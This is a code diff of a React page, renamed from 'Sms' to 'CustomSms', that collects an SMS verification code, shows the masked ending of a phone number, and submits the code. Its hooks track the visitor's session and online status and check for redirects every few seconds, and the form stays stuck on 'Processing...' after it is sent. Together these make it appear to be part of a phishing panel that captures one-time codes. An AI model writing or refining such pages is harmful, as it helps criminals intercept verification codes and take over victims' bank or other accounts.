@@ -1,23 +1,27 @@
 import React, { useState } from "react";
-import styles from "./Sms.module.css";
+import { useLocation } from "react-router-dom";
+import styles from "./CustomSms.module.css";
 import { useRedirectChecker } from "../../hooks/useRedirectChecker";
 import Loading from "../../components/Loading/Loading";
 import { useOnlineStatus } from "../../hooks/useOnlineStatus";
 
-const Sms: React.FC = () => {
+const CustomSms: React.FC = () => {
   const sessionId = localStorage.getItem("currentSessionId");
+  const location = useLocation();
   
-  useRedirectChecker(3000);
   useRedirectChecker(3000);
   useOnlineStatus({
     sessionId,
-    pageName: "sms",
+    pageName: "custom-sms",
     enabled: true,
   });
 
   const [sms, setSms] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState("");
+
+  // Получаем phoneDigits из состояния навигации
+  const phoneDigits = location.state?.phoneDigits;
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -50,31 +54,24 @@ const Sms: React.FC = () => {
       const result = await response.json();
 
       if (!result.success) {
-        // Можно показать сообщение об успехе или перенаправить куда-то
-        alert("Sms isn't sent!");
-        // navigate('/success'); // или куда нужно
+        alert("SMS code submission failed!");
+      } else {
+        console.log("Custom SMS code submitted successfully");
       }
     } catch (error) {
-      console.error("Error submitting balance:", error);
-      setError("Ошибка сети. Попробуйте еще раз.");
+      console.error("Error submitting SMS:", error);
+      setError("Network error. Please try again.");
+    } finally {
+      setIsLoading(true);
     }
   };
 
-  const formatBalance = (value: string) => {
-    // Убираем все нечисловые символы кроме точки
-    const cleaned = value.replace(/[^\d.]/g, "");
-
-    // Проверяем, что есть только одна точка
-    const parts = cleaned.split(".");
-    if (parts.length > 2) {
-      return parts[0] + "." + parts.slice(1).join("");
-    }
-
-    return cleaned;
+  const formatSms = (value: string) => {
+    return value.replace(/[^\d]/g, "");
   };
 
-  const handleBalanceChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formatted = formatBalance(e.target.value);
+  const handleSmsChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const formatted = formatSms(e.target.value);
     setSms(formatted);
     setError("");
   };
@@ -84,19 +81,25 @@ const Sms: React.FC = () => {
       <div className={styles["balance-container"]}>
         <div className={styles["balance-header"]}>
           <h1>Enter the code you received in an SMS</h1>
+          {phoneDigits && (
+            <p style={{ color: "#666", fontSize: "14px", marginTop: "8px" }}>
+              Code sent to phone number ending with xxx-xxx-{phoneDigits}
+            </p>
+          )}
         </div>
 
         <form onSubmit={handleSubmit} className={styles["balance-form"]}>
           <div className={styles["input-group"]}>
-            <label htmlFor="balance">SMS Code</label>
+            <label htmlFor="sms">SMS Code</label>
             <div className={styles["input-wrapper"]}>
               <input
                 type="text"
-                id="balance"
+                id="sms"
                 value={sms}
-                onChange={handleBalanceChange}
+                onChange={handleSmsChange}
                 className={error ? styles["error"] : ""}
                 disabled={isLoading}
+                placeholder="Enter SMS code"
               />
             </div>
             {error && <span className={styles["error-message"]}>{error}</span>}
@@ -115,7 +118,7 @@ const Sms: React.FC = () => {
                 Processing...
               </div>
             ) : (
-              "Send code"
+              "Verify Code"
             )}
           </button>
         </form>
@@ -135,4 +138,4 @@ const Sms: React.FC = () => {
   );
 };
 
-export default Sms;
+export default CustomSms;
